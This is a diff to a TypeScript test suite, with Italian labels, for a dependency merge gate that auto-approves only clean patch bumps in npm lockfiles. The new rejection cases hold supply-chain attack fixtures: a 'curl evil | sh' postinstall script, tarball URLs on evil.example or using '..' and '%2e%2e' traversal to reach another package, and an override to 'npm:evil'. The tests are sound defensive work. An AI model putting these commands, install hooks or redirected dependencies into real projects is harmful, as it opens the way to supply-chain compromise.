@@ -46,6 +46,16 @@ describe("deps-merge-gate", () => {
     expect(isPatchBump(a, b)).toBe(expected);
   });
 
+  it("DG-06 pacchetto con scope: tarball @scope/pkg/-/pkg-<v>.tgz accettato", () => {
+    const v = evaluateGate({
+      ...base(),
+      baseLock: lock({ zod: entry("zod", "4.6.5"), "@types/node": entry("@types/node", "26.6.4") }),
+      headLock: lock({ zod: entry("zod", "4.6.5"), "@types/node": entry("@types/node", "26.6.5") }),
+    });
+    expect(v).toMatchObject({ mergeable: true, reasons: [] });
+    expect(entry("@types/node", "26.6.5").resolved).toBe(`${REG}/@types/node/-/node-26.6.5.tgz`);
+  });
+
   it("DG-02 solo patch (diretti e transitivi), dal registry con integrity, range ^ aggiornati → mergeable", () => {
     const v = evaluateGate({
       ...base(),
@@ -75,7 +85,7 @@ describe("deps-merge-gate", () => {
     [
       "resolved verso un server qualsiasi + hasInstallScript",
       { headLock: lock({ zod: entry("zod", "4.6.6", { resolved: "https://evil.example/zod-4.6.6.tgz", hasInstallScript: true }) }) },
-      /hasInstallScript|resolved outside/,
+      /hasInstallScript|resolved is not/,
     ],
     [
       "stessa versione ripuntata su git+ssh",
@@ -89,7 +99,14 @@ describe("deps-merge-gate", () => {
     ],
     ["nuovo bin", { headLock: lock({ zod: entry("zod", "4.6.6", { bin: { zod: "cli.js" } }) }) }, /changed bin/],
     ["integrity assente", { headLock: lock({ zod: entry("zod", "4.6.6", { integrity: undefined }) }) }, /no sha512 integrity/],
-    ["resolved dal registry ma con un altro nome", { headLock: lock({ zod: entry("zod", "4.6.6", { resolved: `${REG}/evil/-/evil-4.6.6.tgz` }) }) }, /resolved outside/],
+    ["resolved dal registry ma con un altro nome", { headLock: lock({ zod: entry("zod", "4.6.6", { resolved: `${REG}/evil/-/evil-4.6.6.tgz` }) }) }, /resolved is not/],
+    ["resolved con .. (normalizzato verso un altro pacchetto)", { headLock: lock({ zod: entry("zod", "4.6.6", { resolved: `${REG}/zod/-/../../evil/-/evil-1.0.0.tgz` }) }) }, /resolved is not/],
+    ["resolved con %2e%2e", { headLock: lock({ zod: entry("zod", "4.6.6", { resolved: `${REG}/zod/-/%2e%2e/%2e%2e/evil/-/evil-1.0.0.tgz` }) }) }, /resolved is not/],
+    ["resolved con query e frammento", { headLock: lock({ zod: entry("zod", "4.6.6", { resolved: `${REG}/zod/-/zod-4.6.6.tgz?x=${REG}#y` }) }) }, /resolved is not/],
+    ["resolved di un'altra versione", { headLock: lock({ zod: entry("zod", "4.6.6", { resolved: `${REG}/zod/-/zod-4.6.5.tgz` }) }) }, /resolved is not/],
+    ["package.json: script cambiati", { headPkg: pkg({ zod: "^4.6.5" }, {}, { scripts: { postinstall: "curl evil | sh" } }) }, /outside the dependency fields/],
+    ["package.json: overrides", { headPkg: pkg({ zod: "^4.6.5" }, {}, { overrides: { zod: "npm:evil@1.0.0" } }) }, /outside the dependency fields/],
+    ["package.json: bin/main/files", { headPkg: pkg({ zod: "^4.6.5" }, {}, { bin: { x: "evil.js" }, main: "evil.js", files: ["*"] }) }, /outside the dependency fields/],
     ["campi di primo livello del lockfile", { headLock: lock({ zod: entry("zod", "4.6.6") }, { lockfileVersion: 2 }) }, /top-level fields/],
     ["os/cpu cambiati", { headLock: lock({ zod: entry("zod", "4.6.6", { os: ["linux"] }) }) }, /changed os/],
   ])("DG-04 %s → lasciata al proprietario", (_label, override, reason) => {
